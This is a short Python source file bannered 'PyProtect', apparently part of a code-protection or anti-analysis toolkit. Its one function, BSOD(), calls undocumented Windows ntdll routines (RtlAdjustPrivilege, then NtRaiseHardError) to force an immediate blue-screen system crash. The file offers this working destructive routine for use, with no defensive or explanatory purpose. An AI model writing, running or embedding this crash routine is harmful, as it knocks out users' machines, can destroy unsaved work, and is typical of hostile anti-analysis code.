"""
    ____          ____                __               __
   / __ \\ __  __ / __ \\ _____ ____   / /_ ___   _____ / /_
  / /_/ // / / // /_/ // ___// __ \\ / __// _ \\ / ___// __/
 / ____// /_/ // ____// /   / /_/ // /_ /  __// /__ / /_
/_/     \\__, //_/    /_/    \\____/ \\__/ \\___/ \\___/ \\__/
       /____/

Made With ❤️ By Ghoul & Marci
"""

import ctypes


def BSOD() -> None:
    nullptr = ctypes.POINTER(ctypes.c_int)()

    ctypes.windll.ntdll.RtlAdjustPrivilege(
        ctypes.c_uint(19),
        ctypes.c_uint(1),
        ctypes.c_uint(0),
        ctypes.byref(ctypes.c_int()),
    )
    ctypes.windll.ntdll.NtRaiseHardError(
        ctypes.c_ulong(0xC000007B),
        ctypes.c_ulong(0),
        nullptr,
        nullptr,
        ctypes.c_uint(6),
        ctypes.byref(ctypes.c_uint()),
    )
